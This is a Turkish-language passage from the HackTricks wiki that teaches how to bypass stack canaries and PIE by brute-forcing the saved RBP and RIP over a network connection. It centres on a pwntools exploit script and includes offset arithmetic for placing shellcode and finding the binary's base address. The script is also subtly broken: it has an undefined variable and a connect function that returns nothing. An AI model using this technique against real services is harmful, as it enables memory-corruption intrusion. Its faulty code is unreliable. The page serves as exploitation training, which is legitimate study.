# BF Yığınındaki Adresler

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

**Eğer bir canary ve PIE (Pozisyona Bağımsız İkili) ile korunmuş bir ikili ile karşılaşıyorsanız, bunları aşmanın bir yolunu bulmanız gerekecektir.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
**`checksec`** bir ikilinin canary ile korunduğunu bulamayabilir, eğer bu statik olarak derlenmişse ve fonksiyonu tanımlama yeteneği yoksa.\
Ancak, bir fonksiyon çağrısının başında yığında bir değerin kaydedildiğini ve bu değerin çıkmadan önce kontrol edildiğini bulursanız bunu manuel olarak fark edebilirsiniz.
{% endhint %}

## Kaba Kuvvetle Adresler

PIE'yi aşmak için **bazı adresleri sızdırmanız** gerekiyor. Ve eğer ikili herhangi bir adres sızdırmıyorsa, en iyi yol, **savunmasız fonksiyondaki yığında kaydedilen RBP ve RIP'yi kaba kuvvetle denemektir.**\
Örneğin, bir ikili hem **canary** hem de **PIE** kullanılarak korunuyorsa, önce canary'yi kaba kuvvetle denemeye başlayabilirsiniz, ardından **sonraki** 8 Bayt (x64) kaydedilen **RBP** ve **sonraki** 8 Bayt kaydedilen **RIP** olacaktır.

{% hint style="success" %}
Yığında bulunan dönüş adresinin ana ikili koduna ait olduğu varsayılmaktadır; bu, eğer zafiyet ikili kodda bulunuyorsa genellikle böyle olacaktır.
{% endhint %}

İkili dosyadan RBP ve RIP'yi kaba kuvvetle denemek için, program bir şey çıktığında veya sadece çökmediğinde geçerli bir tahmin edilen baytın doğru olduğunu anlayabilirsiniz. **Canary'yi kaba kuvvetle denemek için sağlanan** aynı fonksiyon, RBP ve RIP'yi kaba kuvvetle denemek için de kullanılabilir:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Son PIE'yi yenmek için ihtiyacınız olan son şey, **sızan** adreslerden **yararlı adresleri** hesaplamaktır: **RBP** ve **RIP**.

**RBP**'den, **yığın içinde shell'inizi nereye yazdığınızı** hesaplayabilirsiniz. Bu, yığın içinde _"/bin/sh\x00"_ dizesini nereye yazacağınızı bilmek için çok yararlı olabilir. Sızan RBP ile shellcode'unuz arasındaki mesafeyi hesaplamak için, **RBP'yi sızdırdıktan sonra bir kesme noktası koyabilir** ve **shellcode'unuzun nerede bulunduğunu** kontrol edebilirsiniz, ardından shellcode ile RBP arasındaki mesafeyi hesaplayabilirsiniz:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP**'ten **PIE ikili dosyasının temel adresini** hesaplayabilirsiniz, bu da geçerli bir **ROP zinciri** oluşturmak için gerekecektir.\
Temel adresi hesaplamak için sadece `objdump -d vunbinary` komutunu çalıştırın ve en son adresleri kontrol edin:

![](<../../../../.gitbook/assets/image (145).png>)

Bu örnekte, tüm kodu bulmak için yalnızca **1 Byte ve yarım** gerektiğini görebilirsiniz, bu durumda temel adres **sızdırılan RIP ama "000" ile biten** olacaktır. Örneğin, `0x562002970ecf` sızdırdıysanız, temel adres `0x562002970000`'dır.
```python
elf.address = RIP - (RIP & 0xfff)
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
